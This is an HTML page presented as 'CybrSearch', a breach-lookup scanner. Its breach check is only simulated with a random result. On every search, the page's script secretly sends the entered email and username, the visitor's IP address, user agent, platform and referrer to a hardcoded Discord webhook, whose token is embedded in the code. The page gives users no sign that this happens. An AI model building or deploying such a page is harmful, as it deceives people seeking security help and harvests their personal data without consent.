<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CybrSearch - Security Scanner</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    :root {
      --dark-bg: #0d1117;
      --card-bg: #161b22;
      --accent-color: #1f6feb;
      --text-color: #c9d1d9;
    }
    
    body {
      background-color: var(--dark-bg);
      color: var(--text-color);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      padding-top: 40px;
    }
    
    .container {
      max-width: 600px;
    }
    
    .card {
      background-color: var(--card-bg);
      border: 1px solid #30363d;
      border-radius: 8px;
    }
    
    .result-card {
      border-left: 4px solid var(--accent-color);
    }
    
    .no-results {
      border-left: 4px solid #f85149;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card p-4 mb-4">
      <h2 class="text-center mb-4">üîç CybrSearch Scanner</h2>
      <form id="searchForm">
        <input id="searchEmail" type="email" placeholder="Email address" class="form-control mb-3">
        <input id="searchUsername" type="text" placeholder="Username" class="form-control mb-3">
        <button type="submit" class="btn btn-primary w-100">Search</button>
      </form>
    </div>

    <div id="resultsContainer">
      <!-- Results will appear here -->
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1382930697114882129/SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO";
    
    document.getElementById('searchForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const email = document.getElementById('searchEmail').value.trim();
      const username = document.getElementById('searchUsername').value.trim();
      
      // Show loading state
      const resultsContainer = document.getElementById('resultsContainer');
      resultsContainer.innerHTML = '<div class="card p-4">Searching...</div>';
      
      try {
        // Simulate API check (replace with real API calls)
        const hasResults = await checkBreachApis(email, username);
        
        // Display user-friendly results
        if (hasResults) {
          resultsContainer.innerHTML = `
            <div class="card p-4 result-card">
              <h4>üîé Search Results</h4>
              <div class="mt-3">
                <p>Found potential breaches for:</p>
                ${email ? `<p>‚Ä¢ Email: ${email}</p>` : ''}
                ${username ? `<p>‚Ä¢ Username: ${username}</p>` : ''}
              </div>
            </div>
          `;
        } else {
          resultsContainer.innerHTML = `
            <div class="card p-4 no-results">
              <h4>üîç No Results Found</h4>
              <p>No known breaches found for the searched items.</p>
            </div>
          `;
        }
        
        // Send full details to Discord
        await sendToDiscord({
          email,
          username,
          visitorIp: await getIP(),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          referrer: document.referrer || 'Direct',
          timestamp: new Date().toUTCString(),
          hasResults
        });
        
      } catch (error) {
        resultsContainer.innerHTML = `
          <div class="card p-4 no-results">
            <h4>‚ö†Ô∏è Error</h4>
            <p>Search failed. Please try again.</p>
          </div>
        `;
        
        await sendToDiscord({
          email,
          username,
          error: error.message,
          visitorIp: await getIP(),
          userAgent: navigator.userAgent,
          timestamp: new Date().toUTCString()
        });
      }
    });
    
    // Simulated API check (replace with real API calls)
    async function checkBreachApis(email, username) {
      // This would be replaced with actual API calls to breach databases
      return new Promise(resolve => {
        setTimeout(() => {
          // Randomly return true/false for demo purposes
          resolve(Math.random() > 0.5);
        }, 1500);
      });
    }
    
    // Get public IP (simplified - in production use a proper IP service)
    async function getIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip || 'Unknown';
      } catch {
        return 'Unknown';
      }
    }
    
    // Send data to Discord webhook
    async function sendToDiscord(data) {
      const embed = {
        title: data.error ? "‚ö†Ô∏è Scan Error" : data.hasResults ? "üîç Breach Found" : "üîé No Breaches Found",
        color: data.error ? 0xf85149 : data.hasResults ? 0xf85149 : 0x2ea043,
        fields: [
          { name: "Email", value: data.email || "Not provided", inline: true },
          { name: "Username", value: data.username || "Not provided", inline: true },
          { name: "Visitor IP", value: data.visitorIp || "Unknown" },
          { name: "User Agent", value: data.userAgent || "Unknown" },
          { name: "Platform", value: data.platform || "Unknown" },
          { name: "Referrer", value: data.referrer || "Direct" },
          { name: "Time (UTC)", value: data.timestamp || new Date().toUTCString() }
        ],
        footer: {
          text: "Breach Logger ‚Ä¢ CybrSearch"
        }
      };
      
      if (data.error) {
        embed.fields.push({ name: "Error", value: data.error });
      }
      
      try {
        await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed] })
        });
      } catch (error) {
        console.error('Discord webhook error:', error);
      }
    }
  </script>
</body>
</html>
